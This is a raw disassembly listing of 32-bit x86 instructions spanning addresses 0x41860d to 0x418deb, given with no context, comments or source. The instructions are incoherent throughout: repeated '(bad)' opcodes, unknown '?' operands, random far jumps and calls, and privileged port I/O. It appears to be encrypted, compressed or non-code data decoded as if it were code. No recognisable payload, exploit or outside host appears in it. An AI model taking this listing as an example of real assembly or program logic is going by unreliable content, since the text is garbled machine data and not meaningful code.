  41860d:	or     eax,0x75d71d59
  418612:	mul    DWORD PTR [ecx]
  418614:	sub    DWORD PTR [edx],0x6ffbfa9a
  41861a:	mov    dl,0x60
  41861c:	gs jmp 0x38f51d65
  418622:	aad    0x79
  418624:	shl    DWORD PTR [ecx+0x10819d12],cl
  41862a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41862b:	out    dx,eax
  41862c:	out    dx,al
  41862d:	cmp    ecx,DWORD PTR [esi]
  41862f:	xchg   esp,eax
  418630:	add    ah,BYTE PTR [edi+0x46]
  418633:	add    dh,bl
  418635:	jle    0x41868d
  418637:	jmp    0xe1d0669f
  41863c:	data16 mov BYTE PTR [ecx],al
  41863f:	fidiv  WORD PTR [ebx-0xb6f44ce]
  418645:	jmp    0xd65d365a
  41864a:	add    BYTE PTR [edi],dl
  41864c:	scas   al,BYTE PTR es:[edi]
  41864d:	mov    cl,0xc3
  41864f:	jp     0x4186ce
  418651:	fnstsw WORD PTR [esi+edi*2-0x65]
  418655:	outs   dx,BYTE PTR ds:[esi]
  418656:	pop    ds
  418657:	aam    0x4f
  418659:	jg     0x41866b
  41865b:	pop    edi
  41865c:	(bad)  
  41865d:	or     BYTE PTR [eax+eax*8+0x7f598445],bl
  418664:	fmul   st,st(4)
  418666:	int3   
  418667:	loop   0x418676
  418669:	pop    edx
  41866a:	inc    ecx
  41866b:	inc    ebx
  41866c:	jge    0x4185f2
  41866e:	xchg   ecx,eax
  41866f:	shl    dh,0xe3
  418672:	cmp    al,0x28
  418674:	dec    edi
  418675:	adc    ebx,DWORD PTR [edx+edi*8]
  418678:	sbb    al,0x99
  41867a:	sub    ah,BYTE PTR ds:0xd4a71ae6
  418680:	xor    bl,BYTE PTR [edi+0x5a1b7fcd]
  418686:	pop    eax
  418687:	push   esp
  418688:	push   esp
  418689:	test   BYTE PTR [eax+ebp*2+0x4c2573ac],0xed
  418691:	inc    esp
  418692:	add    ecx,DWORD PTR [edx]
  418694:	int    0x5f
  418696:	or     DWORD PTR [esi+eiz*2-0x37d26367],eax
  41869d:	adc    al,0x89
  41869f:	mov    ah,0xa5
  4186a1:	mov    ebp,0x534c9286
  4186a6:	jmp    0x4186ad
  4186a8:	mov    ds:0x54dec505,al
  4186ad:	xchg   ebp,eax
  4186ae:	push   edx
  4186af:	push   0xffffffc9
  4186b1:	aam    0x0
  4186b3:	or     al,0x7f
  4186b5:	(bad)  
  4186b6:	jmp    FWORD PTR [ecx-0x5915831]
  4186bc:	add    eax,0xe5ab43cb
  4186c1:	cmp    eax,0x5ea097f8
  4186c6:	loopne 0x418741
  4186c8:	mov    edi,fs
  4186ca:	lahf   
  4186cb:	dec    ecx
  4186cc:	dec    ebx
  4186cd:	or     ecx,ebp
  4186cf:	cs add ebp,ebp
  4186d2:	add    dh,BYTE PTR [edi]
  4186d4:	adc    al,0xc7
  4186d6:	sbb    al,0xaa
  4186d8:	jmp    0x41869c
  4186da:	int    0xf5
  4186dc:	dec    DWORD PTR [ebp-0x73]
  4186df:	scas   eax,DWORD PTR es:[edi]
  4186e0:	sbb    DWORD PTR [eax-0x62],0xffffffbb
  4186e4:	add    al,0xf0
  4186e6:	lahf   
  4186e7:	jl     0x418766
  4186e9:	xor    ch,BYTE PTR [ebx]
  4186eb:	loop   0x41870e
  4186ed:	jmp    0x7e1f:0x67fb90cd
  4186f4:	cdq    
  4186f5:	cdq    
  4186f6:	or     eax,0x5dfc8535
  4186fb:	push   edi
  4186fc:	ds inc eax
  4186fe:	xor    al,0x45
  418700:	add    al,0xc7
  418702:	mov    dl,0x83
  418704:	sbb    esp,ebp
  418706:	mov    BYTE PTR [ebx+0x16],ch
  418709:	xchg   ebp,eax
  41870a:	mov    dl,0x67
  41870c:	mov    ds,WORD PTR [edx-0x39]
  41870f:	mov    edx,0x4e1f480f
  418714:	push   ecx
  418715:	add    ebp,DWORD PTR [ebp+0x23]
  418718:	nop
  418719:	mov    al,0x76
  41871c:	mov    ebx,0xd9426c70
  418721:	jl     0x418722
  418723:	call   0x9bb:0x63b91785
  41872a:	jecxz  0x4186ed
  41872c:	stos   BYTE PTR es:[edi],al
  41872d:	leave  
  41872e:	push   ebx
  41872f:	lock ss mov al,0xf0
  418733:	push   es
  418734:	lods   al,BYTE PTR ds:[esi]
  418735:	leave  
  418736:	cli    
  418737:	adc    edi,DWORD PTR [edi+0x50f7ac43]
  41873d:	mov    edi,0xdf593686
  418742:	and    BYTE PTR [edx],dl
  418744:	sub    DWORD PTR [ebx-0x6e2bb370],esi
  41874a:	out    0x9,al
  41874c:	jg     0x4186f4
  41874e:	loope  0x4187ad
  418750:	(bad)  
  418751:	xor    al,0xad
  418753:	mov    eax,ds:0x190bd9f2
  418758:	jmp    0x41878c
  41875a:	jmp    0xfee0349f
  41875f:	jg     0x4186e4
  418761:	nop
  418762:	int    0x58
  418764:	popf   
  418765:	pop    edx
  418766:	xchg   esi,eax
  418767:	shr    DWORD PTR [edi+edx*4],cl
  41876a:	gs push cs
  41876c:	scas   al,BYTE PTR es:[edi]
  41876d:	mov    gs,ebx
  41876f:	int3   
  418770:	jbe    0x418766
  418772:	mov    WORD PTR [edx],?
  418774:	inc    ecx
  418775:	mov    ecx,cs
  418777:	jp     0x4187c9
  418779:	int    0xb7
  41877b:	xor    al,0x35
  41877d:	or     eax,0x236c57b6
  418782:	(bad)  
  418783:	rcr    ah,0x2f
  418786:	clc    
  418787:	fninit 
  418789:	pop    ss
  41878a:	aam    0x3
  41878c:	inc    ecx
  41878d:	sbb    eax,0xd7598cc
  418792:	inc    edx
  418793:	rol    DWORD PTR [eax+0x30715691],cl
  418799:	int    0x2a
  41879b:	pop    edx
  41879c:	aaa    
  41879d:	jmp    0xfebb:0xe4c3402c
  4187a4:	dec    ebx
  4187a5:	xor    al,0x75
  4187a7:	xchg   esp,eax
  4187a8:	and    ebx,DWORD PTR [ebp-0x5262130e]
  4187ae:	dec    edi
  4187af:	jmp    0x9269:0x8256d123
  4187b6:	(bad)  
  4187b7:	outs   dx,DWORD PTR ds:[esi]
  4187b8:	(bad)  
  4187b9:	xchg   ebp,eax
  4187ba:	popa   
  4187bb:	add    eax,0x3a7e6a07
  4187c0:	mov    al,ds:0x61cd8e48
  4187c5:	lods   eax,DWORD PTR ds:[esi]
  4187c6:	mov    esi,?
  4187c8:	jl     0x4187d5
  4187ca:	inc    esi
  4187cb:	sbb    bl,BYTE PTR [esp+ecx*2-0x6f]
  4187cf:	cmc    
  4187d0:	push   es
  4187d1:	and    DWORD PTR [ecx+esi*2+0xebf0dc4],eax
  4187d8:	rcl    edx,cl
  4187da:	dec    ebp
  4187db:	add    eax,0xd2186ac6
  4187e0:	arpl   bp,cx
  4187e2:	repz sbb bh,BYTE PTR [edi]
  4187e5:	mov    ah,0xfe
  4187e7:	mov    WORD PTR [ecx+0x7b8a6532],?
  4187ed:	push   edi
  4187ee:	xor    DWORD PTR [ecx],edi
  4187f0:	add    BYTE PTR [edx+0x2],al
  4187f3:	or     cl,BYTE PTR [ebx-0x3735ff13]
  4187f9:	inc    esi
  4187fa:	mov    WORD PTR [edx+0x28074b9d],cs
  418800:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418801:	mov    esp,0x573cb921
  418806:	sub    al,0x12
  418808:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418809:	mov    edx,0x3d97de5a
  41880e:	jbe    0x4187e3
  418810:	add    ah,BYTE PTR ds:0x6b9a3122
  418816:	repz push 0xc
  418819:	shr    bl,0xdd
  41881c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41881d:	fbstp  TBYTE PTR [ecx+0x5c]
  418820:	lods   al,BYTE PTR ds:[esi]
  418821:	xor    eax,0xf79ffb04
  418826:	cmp    eax,0xcc5c7a76
  41882b:	xlat   BYTE PTR ds:[ebx]
  41882c:	js     0x418831
  41882e:	pop    ebx
  41882f:	pop    ss
  418830:	add    al,ch
  418832:	enter  0xe16,0x98
  418836:	cmp    DWORD PTR ds:0x1f582fcc,edi
  41883c:	das    
  41883d:	lock nop
  41883f:	ss inc edx
  418841:	mov    esi,0x6b523d8d
  418846:	mov    ds:0xa95897df,al
  41884b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41884c:	out    0x5b,al
  41884e:	jg     0x418885
  418850:	fimul  DWORD PTR [ebp-0x48]
  418853:	inc    esp
  418854:	xlat   BYTE PTR ds:[ebx]
  418855:	jmp    0x7ea9:0xccd2ad3
  41885c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41885d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41885e:	pop    esi
  41885f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418860:	sbb    esp,0x1fc52d9
  418866:	sub    eax,DWORD PTR [ebx+0x4d]
  418869:	mov    cl,0x40
  41886b:	sbb    edi,esi
  41886d:	pusha  
  41886e:	mov    ds:0xf0971d1e,eax
  418873:	in     al,0x1
  418875:	nop
  418876:	pop    ecx
  418877:	dec    ecx
  418878:	dec    esp
  418879:	xor    al,0xa5
  41887b:	or     eax,0xe00185e0
  418880:	lea    edi,[edi+0x20]
  418883:	sbb    al,0x85
  418885:	mov    ch,0xfb
  418887:	jb     0x418906
  418889:	mov    dh,0xa
  41888b:	stc    
  41888c:	or     BYTE PTR [edx],bl
  41888e:	mov    edx,ecx
  418890:	and    al,0x57
  418892:	retf   0xc4d3
  418895:	mov    eax,esi
  418897:	dec    edx
  418898:	data16 add BYTE PTR [eax+edx*4-0xad5c023],ah
  4188a0:	aaa    
  4188a1:	hlt    
  4188a2:	arpl   WORD PTR [esi+0x1a8ded4],bx
  4188a8:	test   dl,bl
  4188aa:	and    dh,BYTE PTR [edx-0x56]
  4188ad:	inc    esi
  4188ae:	pop    ss
  4188af:	mov    ds:0xc26ccbe9,al
  4188b4:	inc    ebx
  4188b5:	jge    0x41890d
  4188b7:	sub    edi,DWORD PTR ds:0x1d9ade6d
  4188bd:	pop    edi
  4188be:	sub    DWORD PTR [edi-0x1c],edi
  4188c1:	fimul  WORD PTR [eax-0x5c]
  4188c4:	call   0x835c:0x10d3e9d5
  4188cb:	test   eax,0xd42997cf
  4188d0:	mov    BYTE PTR [ebx],bh
  4188d2:	mov    al,BYTE PTR [edi+0x14b19739]
  4188d8:	mov    eax,ds:0x61376e14
  4188dd:	mov    ds:0x79a5fce2,al
  4188e2:	addr16 mov ch,0xfa
  4188e5:	add    eax,0x850c6d9e
  4188ea:	mov    ebp,0xf9b24fb
  4188ef:	and    DWORD PTR [eax],ecx
  4188f1:	fldenv [edi-0x4b]
  4188f4:	pop    ebp
  4188f5:	cmp    DWORD PTR [esi+edi*1+0x7e],esi
  4188f9:	fistp  DWORD PTR ds:0x24f4271d
  4188ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418900:	idiv   esp
  418902:	cdq    
  418903:	imul   ebp,ebp,0x7e
  418906:	popa   
  418907:	inc    ebx
  418908:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418909:	jae    0x418897
  41890b:	cmp    DWORD PTR [ecx+0x63b70a0e],ebp
  418911:	ret    
  418912:	rol    DWORD PTR [eax],cl
  418914:	pusha  
  418915:	retf   0xe84d
  418918:	sub    al,0xf4
  41891a:	aaa    
  41891b:	pop    ss
  41891c:	fist   WORD PTR [esi]
  41891e:	push   0xf
  418920:	in     al,dx
  418921:	mov    ecx,0x3c3833f1
  418926:	mov    edx,0xc671aae7
  41892b:	jne    0x4189a3
  41892d:	xor    cl,dh
  41892f:	cmc    
  418930:	fnstenv [ecx-0x37]
  418933:	mov    BYTE PTR [eax+0x3c249d4a],dh
  418939:	stc    
  41893a:	stos   BYTE PTR es:[edi],al
  41893b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41893c:	mov    ebx,cs
  41893e:	sbb    BYTE PTR [ecx-0x3a],bl
  418941:	pop    eax
  418942:	mov    ecx,0xd86abe68
  418947:	jbe    0x41892d
  418949:	div    cl
  41894b:	jb     0x4188cd
  41894d:	sub    eax,0x7391f019
  418952:	bound  esp,QWORD PTR [ecx+edx*2+0x7e525b26]
  418959:	call   0xf89c:0x3156d80b
  418960:	or     BYTE PTR [ecx+0x1b],0x6c
  418964:	push   ss
  418965:	cmp    ecx,edi
  418967:	dec    ecx
  418968:	rol    ch,1
  41896a:	inc    esp
  41896b:	ret    0xc4e1
  41896e:	stos   BYTE PTR es:[edi],al
  41896f:	or     DWORD PTR [esi+0x740ace2a],esp
  418975:	enter  0xf614,0xff
  418979:	pop    ebx
  41897a:	sar    dh,0x35
  41897d:	inc    ebp
  41897e:	xchg   BYTE PTR [ebx+eax*2-0x7fa7dce2],bh
  418985:	loope  0x4189a4
  418987:	cmp    eax,0xf368dcac
  41898c:	inc    ebx
  41898d:	xchg   ecx,eax
  41898e:	popf   
  41898f:	ins    BYTE PTR es:[edi],dx
  418990:	in     al,0x45
  418992:	ja     0x41895d
  418994:	or     ecx,DWORD PTR [ecx+0x635144ea]
  41899a:	xchg   edi,eax
  41899b:	aas    
  41899c:	jbe    0x41899d
  41899e:	cmp    BYTE PTR [ecx],dh
  4189a0:	data16 cmp ah,BYTE PTR [ebp+0x2ca77920]
  4189a7:	push   ds
  4189a8:	sbb    BYTE PTR [edx],dh
  4189aa:	add    BYTE PTR [edi],dl
  4189ac:	fdivr  QWORD PTR [ecx+0x76]
  4189af:	add    ah,al
  4189b1:	(bad)  
  4189b2:	int3   
  4189b3:	xchg   edx,eax
  4189b4:	or     esp,ecx
  4189b6:	jns    0x4189d7
  4189b8:	in     eax,dx
  4189b9:	imul   esi,DWORD PTR [edx+0x47],0x57d4be5a
  4189c0:	mov    esi,0x4a0dc8ac
  4189c5:	cmp    edi,esi
  4189c7:	pop    ebx
  4189c8:	(bad)  
  4189c9:	xchg   ebp,eax
  4189ca:	sti    
  4189cb:	inc    esp
  4189cc:	push   ds
  4189cd:	imul   ecx,ebp,0x761eb579
  4189d3:	jmp    0x418962
  4189d5:	push   0x5dc696fd
  4189da:	into   
  4189db:	inc    edi
  4189dc:	pushf  
  4189dd:	lods   eax,DWORD PTR ds:[esi]
  4189de:	imul   edx,DWORD PTR [eax],0xb75e5f8c
  4189e4:	cdq    
  4189e5:	aam    0xf0
  4189e7:	sub    eax,0x97e092d5
  4189ec:	aam    0x60
  4189ee:	aas    
  4189ef:	test   dl,bh
  4189f1:	rcr    ch,0x9a
  4189f4:	call   0x500:0x98bca58e
  4189fb:	test   BYTE PTR [edx+0x2],cl
  4189fe:	mov    DWORD PTR [edx-0x59],ecx
  418a01:	jmp    0x418a52
  418a03:	fdivr  st(5),st
  418a05:	dec    edi
  418a06:	sahf   
  418a07:	int    0x1f
  418a09:	pop    es
  418a0a:	jno    0x4189a4
  418a0c:	push   eax
  418a0d:	retf   
  418a0e:	or     eax,0x7126cec
  418a13:	mov    BYTE PTR [ebp+0xa7e56fe],bl
  418a19:	inc    ebp
  418a1a:	push   edi
  418a1b:	repz aaa 
  418a1d:	mov    dl,0xff
  418a1f:	or     al,0x7f
  418a21:	mov    ch,0x64
  418a23:	jle    0x418a46
  418a25:	(bad)  
  418a26:	popa   
  418a27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a28:	addr16 call 0x1b7a:0x819f6a3a
  418a30:	retf   0xf9c3
  418a33:	(bad)  
  418a34:	fsubr  DWORD PTR [ebp+0x120196bd]
  418a3a:	mov    cl,0x1d
  418a3c:	and    al,BYTE PTR [ebx-0x5e]
  418a3f:	jle    0x4189c6
  418a41:	jge    0x4189e2
  418a43:	jmp    0x282f:0xbc537a43
  418a4a:	imul   ebx,DWORD PTR [esi-0x12],0x30
  418a4e:	sbb    eax,edi
  418a50:	push   ss
  418a51:	ins    DWORD PTR es:[edi],dx
  418a52:	clc    
  418a53:	jg     0x418ac8
  418a55:	push   esp
  418a56:	(bad)  
  418a57:	xchg   ebx,eax
  418a58:	mov    ds:0x8f51d447,eax
  418a5d:	fnstcw WORD PTR [esi]
  418a5f:	iret   
  418a60:	dec    ecx
  418a61:	pop    ss
  418a62:	jmp    0xc12:0x2009c877
  418a69:	sbb    eax,0xd740b8e4
  418a6e:	push   esi
  418a6f:	inc    eax
  418a70:	mov    esi,0x9914f4de
  418a75:	sar    BYTE PTR [edi-0x3bd05ab],0xaf
  418a7c:	inc    edx
  418a7d:	sub    al,0xff
  418a7f:	adc    DWORD PTR [edx+0x7c0cb10f],esp
  418a85:	pop    ss
  418a86:	retf   
  418a87:	imul   esi,DWORD PTR [ebx+0x14],0xd5cceff8
  418a8e:	inc    eax
  418a8f:	add    BYTE PTR [ebx+edi*4-0x2c],bh
  418a93:	lock inc esp
  418a95:	add    DWORD PTR [eax],ebx
  418a97:	lea    edx,[eax-0x2fabb98c]
  418a9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a9e:	sbb    al,0x33
  418aa0:	pop    ds
  418aa1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418aa2:	mov    esp,0x5de8b7ef
  418aa7:	cdq    
  418aa8:	sti    
  418aa9:	mov    ecx,0xd3a2b27c
  418aae:	lods   eax,DWORD PTR ds:[esi]
  418aaf:	inc    BYTE PTR [ecx]
  418ab1:	pop    eax
  418ab2:	xchg   edi,eax
  418ab3:	mov    dl,0x2f
  418ab5:	sub    eax,0xdd5c1e0
  418aba:	inc    ebp
  418abb:	sbb    eax,ebx
  418abd:	adc    dh,ch
  418abf:	sbb    DWORD PTR [esi+0x61],edi
  418ac2:	lea    esp,[ebx]
  418ac4:	retf   
  418ac5:	jnp    0x418a5e
  418ac7:	popf   
  418ac8:	xlat   BYTE PTR ds:[ebx]
  418ac9:	sbb    ah,BYTE PTR [ecx-0x62]
  418acc:	mov    ds:0xe9357846,al
  418ad1:	movhps xmm2,QWORD PTR [ebx+0x562ec747]
  418ad8:	fsubr  QWORD PTR es:[ebx]
  418adb:	bnd jle 0x418acc
  418ade:	push   edx
  418adf:	out    dx,eax
  418ae0:	and    al,0xfa
  418ae2:	inc    esp
  418ae3:	pop    edi
  418ae4:	mov    eax,ds:0x4b6a01f5
  418ae9:	sbb    al,BYTE PTR ds:0x49b5
  418aee:	sahf   
  418aef:	push   cs
  418af0:	xor    eax,DWORD PTR [ebx+0x39]
  418af3:	cmp    al,0x4d
  418af5:	mov    dh,0x2f
  418af7:	cli    
  418af8:	xor    al,0x15
  418afa:	inc    ecx
  418afb:	sub    al,0xd5
  418afd:	sub    DWORD PTR ds:0x854720d,edi
  418b03:	gs or  al,0x7a
  418b06:	sub    eax,0x391aae54
  418b0b:	jg     0x418b34
  418b0d:	lods   eax,DWORD PTR ds:[esi]
  418b0e:	pop    esp
  418b0f:	xor    dl,BYTE PTR [eax+eiz*8]
  418b12:	out    0xd5,eax
  418b14:	mov    dl,0xd7
  418b16:	aaa    
  418b17:	fwait
  418b18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b19:	repz mov ebp,0xee02010d
  418b1f:	imul   esp,edi,0xba01791
  418b25:	iret   
  418b26:	push   ecx
  418b27:	or     DWORD PTR [bp+0x7e06],edx
  418b2c:	popf   
  418b2d:	into   
  418b2e:	or     al,0xd4
  418b30:	fisubr WORD PTR [ebp-0x560591c4]
  418b36:	fdivr  DWORD PTR [ebp+0xcde019a]
  418b3c:	xchg   edx,eax
  418b3d:	out    0x13,al
  418b3f:	and    DWORD PTR [ecx-0x433fb74d],ebx
  418b45:	xor    edx,DWORD PTR [eax]
  418b47:	dec    ebx
  418b48:	out    0x50,eax
  418b4a:	lahf   
  418b4b:	xor    DWORD PTR [edx],edx
  418b4d:	jmp    0x418b52
  418b4f:	pop    ebp
  418b50:	cmp    al,0x2e
  418b52:	(bad)  
  418b54:	sbb    eax,0x695b107d
  418b59:	dec    esp
  418b5a:	jmp    0x418afe
  418b5c:	or     DWORD PTR [edi-0xf],0x55
  418b60:	sbb    dh,BYTE PTR [eax]
  418b62:	and    al,0xd1
  418b64:	mov    al,ds:0x57660690
  418b69:	push   ebx
  418b6a:	sbb    bh,ch
  418b6c:	pop    esi
  418b6d:	aam    0xb3
  418b6f:	mov    eax,0x7004c366
  418b74:	add    DWORD PTR ds:0x3d564adc,esp
  418b7a:	test   eax,0xe143ce07
  418b7f:	out    0x83,eax
  418b81:	pop    ecx
  418b82:	jno    0x418bbc
  418b84:	ret    
  418b85:	fisttp QWORD PTR [edi+0x17]
  418b88:	pop    esi
  418b89:	repz lahf 
  418b8b:	lea    ecx,[eax]
  418b8d:	aad    0x60
  418b8f:	lods   al,BYTE PTR ds:[esi]
  418b90:	sbb    dh,ch
  418b92:	add    al,0x26
  418b94:	in     al,dx
  418b95:	mov    ds:0x42ce150d,al
  418b9a:	ss jl  0x418b4c
  418b9d:	push   eax
  418b9e:	inc    ebp
  418b9f:	lea    edx,[ebx-0x24369bac]
  418ba5:	mov    bh,0xe3
  418ba7:	test   edi,ecx
  418ba9:	outs   dx,DWORD PTR ds:[esi]
  418baa:	xor    DWORD PTR [eax+eax*8],esi
  418bad:	push   0xfffffff8
  418baf:	lock in al,dx
  418bb1:	push   0x32
  418bb3:	das    
  418bb4:	lods   eax,DWORD PTR ds:[esi]
  418bb5:	inc    ecx
  418bb6:	(bad)  
  418bb7:	or     BYTE PTR [ecx+0x5e],cl
  418bba:	out    dx,al
  418bbb:	sti    
  418bbc:	fidiv  DWORD PTR [eax+0x8]
  418bbf:	adc    ecx,DWORD PTR [edx-0x1b]
  418bc2:	jmp    0x418b62
  418bc4:	call   0x9d2ebc1f
  418bc9:	mov    ebp,0x7e7cf6f2
  418bce:	fild   DWORD PTR [ebx]
  418bd0:	(bad)  
  418bd1:	sub    dh,BYTE PTR [ebx+0x23]
  418bd4:	mov    WORD PTR [ecx],ss
  418bd6:	imul   ecx,edx,0xa
  418bd9:	jmp    0xf0516543
  418bde:	jb     0x418c3d
  418be0:	sub    BYTE PTR [edi],ch
  418be2:	mov    ebp,0xcb90dc46
  418be7:	rep stos BYTE PTR es:[edi],al
  418be9:	xchg   BYTE PTR [ebx+eiz*1-0xc],ah
  418bed:	and    dl,BYTE PTR [ebx-0x788ef785]
  418bf3:	loope  0x418b95
  418bf5:	mov    al,0x97
  418bf7:	call   0x37fe:0xf259d104
  418bfe:	add    edi,esi
  418c00:	pop    esp
  418c01:	xor    eax,DWORD PTR [esi]
  418c03:	xor    eax,0x66322f92
  418c08:	xchg   DWORD PTR ds:0x8a235f3e,esi
  418c0e:	push   edx
  418c0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c11:	or     eax,0xc8689e04
  418c16:	in     eax,0x76
  418c18:	pop    ecx
  418c19:	mov    ecx,0xe27a3ec3
  418c1e:	ficom  WORD PTR [edx+0x18c8556d]
  418c24:	fwait
  418c25:	(bad)
  418c28:	mov    bh,0x6b
  418c2a:	push   cs
  418c2b:	xchg   esi,eax
  418c2c:	ja     0x418bef
  418c2e:	cmp    al,0x76
  418c30:	mov    al,BYTE PTR [eax-0x76c201e7]
  418c36:	mov    ?,WORD PTR [ebp+0x773fc46b]
  418c3c:	out    0x1b,al
  418c3e:	xor    DWORD PTR [esp],0xffffffcf
  418c42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c43:	in     al,dx
  418c44:	jno    0x418c4f
  418c46:	and    DWORD PTR [ebp-0x5a8ed64c],ebx
  418c4c:	aas    
  418c4d:	or     bh,ah
  418c4f:	mov    ch,0xbf
  418c51:	pop    esp
  418c52:	sub    DWORD PTR [ebx+0x61],esp
  418c55:	retf   
  418c56:	sub    al,0xa0
  418c58:	cmp    al,0x9d
  418c5a:	ss add ch,bl
  418c5d:	clc    
  418c5e:	xchg   ebp,eax
  418c5f:	cld    
  418c60:	mov    esi,0xa7333555
  418c65:	fnstenv [edi-0x1f]
  418c68:	dec    edx
  418c69:	pop    esp
  418c6a:	aas    
  418c6b:	lahf   
  418c6c:	pop    ebp
  418c6d:	pop    esp
  418c6e:	loope  0x418cd6
  418c70:	hlt    
  418c71:	or     edx,edi
  418c73:	mov    ?,WORD PTR [edx-0x28]
  418c76:	xchg   esp,eax
  418c77:	and    DWORD PTR [ebp+0x1538a7c3],ecx
  418c7d:	inc    ebx
  418c7e:	cmp    eax,0x611c3073
  418c83:	fcomp  st(3)
  418c85:	mov    bh,0xd4
  418c87:	sbb    eax,0xca064c4a
  418c8c:	jo     0x418c14
  418c8e:	rcr    DWORD PTR [ebp-0xa99f74f],0x22
  418c95:	xchg   edi,eax
  418c96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c97:	shr    BYTE PTR [esi-0x17],cl
  418c9a:	cmp    BYTE PTR [edx],bh
  418c9c:	pop    edi
  418c9d:	mov    ds:0xcf9a6518,eax
  418ca2:	out    dx,eax
  418ca3:	ins    BYTE PTR es:[edi],dx
  418ca4:	mov    dh,0xe8
  418ca6:	ror    BYTE PTR [esi+0x4b1eef08],1
  418cac:	jmp    0x504ca15e
  418cb1:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  418cb3:	inc    esp
  418cb4:	dec    ecx
  418cb5:	mov    ebp,ecx
  418cb7:	dec    eax
  418cb8:	fstp   TBYTE PTR [ecx+0x7c9cb620]
  418cbe:	and    BYTE PTR [edi+0x27b45821],bl
  418cc4:	or     ch,BYTE PTR [edi+0x460a98e3]
  418cca:	cdq    
  418ccb:	pop    edi
  418ccc:	xchg   ebp,eax
  418ccd:	mov    BYTE PTR [ebp-0x4aa79e66],dl
  418cd3:	aas    
  418cd4:	add    DWORD PTR [esi],ebx
  418cd6:	cmp    ebx,0xc
  418cd9:	cmp    BYTE PTR [esi+0x6594b648],0xe9
  418ce0:	xor    ch,0xd7
  418ce3:	or     DWORD PTR [esi-0x4e],esp
  418ce6:	int    0x21
  418ce8:	fwait
  418ce9:	push   es
  418cea:	or     BYTE PTR [ecx-0x56a539c],0xcf
  418cf1:	jmp    0xdaa4:0x5872982c
  418cf8:	aam    0x48
  418cfa:	mov    edi,0x6e1dd42e
  418cff:	cmp    eax,0x9c9e12e3
  418d04:	data16 (bad) 
  418d06:	cmp    BYTE PTR [ebp+0x1a],ch
  418d09:	xor    BYTE PTR [ebp+0x20],0x35
  418d0d:	or     cl,bh
  418d0f:	das    
  418d10:	cmp    edi,esp
  418d12:	stos   BYTE PTR es:[edi],al
  418d13:	add    ch,ah
  418d15:	push   ss
  418d16:	or     cl,BYTE PTR cs:[edx]
  418d19:	out    0x51,eax
  418d1b:	inc    esi
  418d1c:	fldcw  WORD PTR [ebx+0x1c]
  418d1f:	data16 fmul st(5),st
  418d22:	lock xor BYTE PTR [edx+ecx*2-0x211be76],ah
  418d2a:	out    0x3d,al
  418d2c:	fs push esi
  418d2e:	(bad)  
  418d2f:	fild   WORD PTR [edi+0x38]
  418d32:	ins    DWORD PTR es:[edi],dx
  418d33:	xchg   ecx,eax
  418d34:	and    DWORD PTR [ebp+edx*4-0x5f],ebp
  418d38:	jnp    0x418d0c
  418d3a:	jg     0x418d43
  418d3c:	mov    ebx,0xbb62fcab
  418d41:	ficomp WORD PTR [edx-0x100a4b7]
  418d47:	call   0x9743d3f8
  418d4c:	std    
  418d4d:	inc    ebp
  418d4e:	mov    cl,0x64
  418d50:	mov    edx,0xe9d48db8
  418d55:	mov    WORD PTR [ebx+0x20],ds
  418d58:	outs   dx,DWORD PTR ds:[esi]
  418d59:	jne    0x418d8a
  418d5b:	rcr    BYTE PTR [ecx-0x1e],cl
  418d5e:	lods   eax,DWORD PTR ds:[esi]
  418d5f:	and    DWORD PTR [eax+ebx*1-0x78],ebx
  418d63:	and    eax,0xf50bdad2
  418d68:	and    eax,0xc06ff12e
  418d6d:	sbb    al,al
  418d6f:	sub    eax,0x8f7deefd
  418d74:	jns    0x418cf9
  418d76:	xor    al,0x69
  418d78:	xchg   cx,ax
  418d7a:	loope  0x418d8f
  418d7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d7d:	shl    DWORD PTR [ebx+0x17],0xea
  418d81:	xor    BYTE PTR cs:[ebx+0x2e],bh
  418d85:	mov    BYTE PTR [edi+0x67],ch
  418d88:	push   ds
  418d89:	aad    0x1d
  418d8b:	test   eax,0xb46532ad
  418d90:	mov    ebp,0xf248d4dd
  418d95:	mov    dh,0x96
  418d97:	and    BYTE PTR [ecx-0x53],al
  418d9a:	sub    eax,0x2dd1dad9
  418d9f:	addr16 adc dh,bh
  418da2:	xlat   BYTE PTR ds:[ebx]
  418da3:	sahf   
  418da4:	pop    esp
  418da5:	inc    edi
  418da6:	and    al,0x12
  418da8:	xchg   ebp,eax
  418da9:	xchg   ecx,eax
  418daa:	jg     0x418d67
  418dac:	mov    ecx,0xa01e8a1
  418db1:	in     al,dx
  418db2:	dec    eax
  418db3:	leave  
  418db4:	and    dl,BYTE PTR [eax+0x51]
  418db7:	shr    DWORD PTR cs:[edi],1
  418dba:	dec    esp
  418dbb:	call   0x4cd2:0xb4fae84c
  418dc2:	std    
  418dc3:	mov    ebp,ebp
  418dc5:	or     eax,0xf4d93e39
  418dca:	test   DWORD PTR [edx],0xc07a00c2
  418dd0:	jge    0x418d89
  418dd2:	(bad)  
  418dd3:	cmp    al,0x7
  418dd5:	loopne 0x418d60
  418dd7:	sti    
  418dd8:	cld    
  418dd9:	(bad)  
  418dda:	pusha  
  418ddb:	mov    dl,0x74
  418ddd:	cdq    
  418dde:	cmp    BYTE PTR [esi+0x6d],bl
  418de1:	loopne 0x418e2c
  418de3:	mov    esp,0xde639726
  418de8:	jbe    0x418e65
  418dea:	pop    edx
  418deb:	sti    
